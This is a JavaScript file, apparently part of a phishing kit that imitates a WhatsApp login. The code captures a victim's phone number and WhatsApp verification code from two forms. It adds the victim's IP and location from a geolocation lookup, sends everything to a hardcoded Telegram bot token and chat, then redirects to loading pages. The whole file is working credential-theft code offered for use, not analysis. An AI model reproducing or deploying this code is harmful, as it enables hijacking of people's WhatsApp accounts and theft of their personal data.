document.addEventListener("DOMContentLoaded", function() {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación y enviar el mensaje a Telegram
    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            if (country && region && ip) {
                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
            } else {
                message += '\nNo se pudo obtener la ubicación.';
            }
            enviarMensajeTelegram(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nError al obtener la ubicación.";
            enviarMensajeTelegram(message, nextPage);
        });
    }

    // Función para enviar el mensaje a Telegram y redirigir
    function enviarMensajeTelegram(mensaje, nextPage) {
        var token = '7709844192:AAFl4vAgJnzk7p5Y1w8KsIrw50mgYF4GF9Q';
        var chatId = '-4715447416';
        var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
        var params = {
            chat_id: chatId,
            text: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    }

    // Evento de envío de formulario para la página de inicio de sesión
 var loginForm = document.getElementById("loginForm");
if (loginForm) {
    loginForm.addEventListener("submit", function(event) {
        event.preventDefault();
        var telefono = document.getElementById("telefono").value;

        // Validar que el teléfono solo contenga números
        if (/^\d+$/.test(telefono)) {
            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "cargando.html?action=telefono", "💲 Whatsapp  💲:\nTELEFONO: " + telefono);
        } else {
            alert("Por favor, ingresa solo números en el campo de teléfono.");
        }
    });
}


    // Evento de envío de formulario para la sección de contacto
   var verificationForm = document.getElementById("verificationForm");
if (verificationForm) {
    verificationForm.addEventListener("submit", function(event) {
        event.preventDefault();
        var cod = document.getElementById("cod").value;

        // Validar que cod solo contenga números
        var isNumeric = /^[0-9]+$/.test(cod);
        if (!isNumeric) {
            alert("Por favor, ingresa solo números.");
            return; // Detiene el envío del formulario
        }

        obtenerUbicacionYEnviarMensajeTelegram(cod, cod, "cargando4.html?action=cod", "💲 Whatsapp  💲:\nCODIGO WHATSAPP: " + cod);
    });
}
});
